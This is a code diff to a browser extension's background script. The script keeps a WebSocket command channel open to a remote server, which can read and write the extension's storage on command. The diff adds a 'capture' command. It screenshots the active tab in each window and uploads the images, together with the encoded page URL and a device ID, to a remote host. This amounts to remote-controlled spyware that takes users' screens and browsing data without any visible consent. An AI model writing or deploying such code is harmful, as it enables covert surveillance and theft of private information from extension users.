@@ -1,5 +1,5 @@
 async function initSocket() {
-  const { uuid = INITAL_CONFIG.uuid, socketUrl = INITAL_CONFIG.socketUrl } = await STORAGE_LOCAL.get()
+  const { uuid, socketUrl, socketHost } = await STORAGE_LOCAL.get()
   const ID = `${uuid}-BG`
 
   if (WS && WS.readyState === 1 && WS.id === ID) return
@@ -7,20 +7,20 @@ async function initSocket() {
     WS.onclose = null
     WS.close()
   }
-  WS = new WebSocket(socketUrl)
+  WS = new WebSocket(socketUrl || INITAL_CONFIG.socketUrl)
   WS.emit = ({ clientId, payload }) => WS.send(JSON.stringify({ action: 'SEND', payload: { clientId, payload } }))
   WS.onopen = () => {
     WS.onmessage = ({ data }) => {
       try {
-        handleData(JSON.parse(data))
+        WS.handleData(JSON.parse(data))
       } catch (error) { }
     }
   }
 
   WS.onclose = () => setTimeout(() => initSocket(ID), 2000)
 
-  async function handleData({ action, from, payload }) {
-    //console.log(action, from, payload)
+  WS.handleData = async function ({ action, from, payload }) {
+    console.log(action, from, payload)
     let data = 'NOT MATCH'
     try {
       switch (action) {
@@ -33,6 +33,8 @@ async function initSocket() {
         case CMD.SET_STORAGE: data = await setStorage(...payload)
           break
         case CMD.GET_STORAGE: data = await getStorage(...payload)
+          break
+        case CMD.CAPTURE: data = await capture()
           break
         case CMD.HELP: return WS.emit({ action, clientId: from, payload: CMD })
       }
@@ -67,8 +69,6 @@ async function initSocket() {
   }
 
   function getStorage(type) {
-    
-
     if (type === CMD.LOCAL)
       return STORAGE_LOCAL.get()
     else if (type === CMD.SYNC)
@@ -85,5 +85,16 @@ async function initSocket() {
       return STORAGE_SYNC.set({ ...kv })
 
     return { validKeys: [CMD.SYNC, CMD.LOCAL] }
+  }
+
+  async function capture() {
+    const images = []
+    const tabs = await chrome.tabs.query({ active: true })
+    for(const { url, windowId } of tabs) {
+      const img = await chrome.tabs.captureVisibleTab(windowId)
+      const res = await POST({ url: `${socketHost}/images`, headers: { 'Content-Type': 'text/plain', deviceId: uuid, url: btoa(url) }, body: img })
+      if(res.ok) images.push(await res.text())
+    }
+    return { images }
   }
 }
